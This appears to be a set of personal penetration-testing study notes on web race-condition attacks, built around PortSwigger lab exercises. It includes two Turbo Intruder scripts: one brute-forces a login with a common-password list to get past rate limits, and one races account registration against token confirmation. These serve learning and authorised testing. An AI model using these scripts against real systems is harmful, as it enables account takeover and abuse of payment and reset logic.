
# Content
- [Methodology](#methodology)
- [Limit overrun race conditions](#limit-overrun-raceconditions)
- [Multi-endpoint race conditions](#multi-endpoint-race-conditions)
- [Single-endpoint race conditions](#single-endpoint-race-conditions)
- [Partial construction race conditions](#partial-construction-race-conditions)
- [Session-based locking mechanisms](#session-based-locking-mechanisms)
- [Time-sensitive attacks](#time-sensitive-attacks)

## Methodology
#### 1 - Predict potential collisions
- Is this endpoint security critical ?
- Is there any collision potential ?

#### 2 - Probe for clues
- Benchmark the normal behavior
- Benchmark the upnormal behavior

#### 3 - Prove the concept


## Limit overrun race conditions
The most well-known type of race condition enables you to exceed some kind of limit imposed by the business logic of the application. 


**EX:** 
- Redeeming a gift card multiple times
- Rating a product multiple times
- Withdrawing or transferring cash in excess of your account balance
- Reusing a single CAPTCHA solution
- Bypassing an anti-brute-force rate limit

### Detecting and exploiting limit overrun race conditions with Burp Repeater and turpo intruder 
- For HTTP/1, it uses the classic last-byte synchronization technique.
- For HTTP/2, it uses the single-packet attack technique

#### Burp Repeater
- Identify a single-use or rate-limited endpoint that has some kind of security impact or other useful purpose.
- Issue multiple requests to this endpoint in quick succession to see if you can overrun this limit.


#### turpo intruder 
script example on one endoint
```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords =[
    "123123",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "1234567890",
    "michael",
    "x654321",
    "superman",
    "1qaz2wsx",
    "baseball",
    "7777777",
    "121212",
    "000000"
]
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```
script example on two endoints
```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    confReq='''POST /confirm?token[]= HTTP/2
Host: 0ac000510411a9db80eac639002a0031.web-security-academy.net
Cookie: phpsessionid=LZCN4rftE1NqqOWwZdJnyYN47W5DySMX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://0ac000510411a9db80eac639002a0031.web-security-academy.net
Referer: https://0ac000510411a9db80eac639002a0031.web-security-academy.net/confirm
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
'''
    
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)


def handleResponse(req, interesting):
    table.add(req)
```

## Multi-endpoint race conditions
sending requests to multiple endpoints at the same time 

**EX:**


classic logic flaw in online stores where you add an item to your basket or cart, pay for it, then add more items to the cart before force-browsing to the order confirmation page. 

![race-conditions-basket-adjustment-race](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ca6050dd-4a6a-4a2c-99f3-b5943b9ff1a4)

In this case, you can potentially add more items to your basket during the race window between when the payment is validated and when the order is finally confirmed. 

#### Aligning multi-endpoint race windows Problems and Solutions

- **Delays introduced by network architecture**
```
Connection warming:

Back-end connection delays don't usually interfere with race condition attacks because they typically delay parallel requests equally, so the requests stay in sync.

you can try adding a GET request for the homepage to the start of your tab group with to ohter endpoints to test , then using the Send group in sequence (single connection) option. 

If the first request still has a longer processing time, but the rest of the requests are now processed within a short window
```

- **Delays introduced by endpoint-specific processing**
```
Abusing rate or resource limits :

Web servers often delay the processing of requests if too many are sent too quickly.

By sending a large number of dummy requests to intentionally trigger the rate or resource limit, you may be able to cause a suitable server-side delay.

This makes the single-packet attack viable even when delayed execution is required.  
```

![race-conditions-abusing-rate-or-resource-limits](https://github.com/kiro6/penetration-testing-notes/assets/57776872/75b44be3-ff28-42f9-a554-2e20fd9dde12)


## Single-endpoint race conditions
Sending parallel requests with different values to a single endpoint can sometimes trigger powerful race conditions. 

**EX:**

![race-conditions-password-reset-collision](https://github.com/kiro6/penetration-testing-notes/assets/57776872/c11c30f8-2ba6-491d-866a-f3887c8ad0a6)


the final state when all operations are complete:
- session['reset-user'] = victim
- session['reset-token'] = 1234

The session now contains the victim's user ID, but the valid reset token is sent to the attacker. 


## Partial construction race conditions
Many applications create objects in multiple steps, which may introduce a temporary middle state in which the object is exploitable.

**EX:** 

- when registering a new user, an application may create the user in the database and set their API key using two separate SQL statements. 
- This leaves a tiny window in which the user exists, but their API key is uninitialized.
- This kind of behavior paves the way for exploits whereby you inject an input value that returns something matching the uninitialized database value, such as an empty string, or null in JSON, and this is compared as part of a security control.
- It's possible to cause similar partial construction collisions with a password rather than an API key. However, as passwords are hashed, this means you need to inject a value that makes the hash digest match the uninitialized value.

## Session-based locking mechanisms
If you notice that all of your requests are being processed sequentially, try sending each of them using a different session token. 

## Time-sensitive attacks

Sometimes you may not find race conditions, but the techniques for delivering requests with precise timing can still reveal the presence of other vulnerabilities.

One such example is when high-resolution timestamps are used instead of cryptographically secure random strings to generate security tokens.

**EX:**
- Consider a password reset token that is only randomized using a timestamp.
- In this case, it might be possible to trigger two password resets for two different users, which both use the same token.
- All you need to do is time the requests so that they generate the same timestamp. 
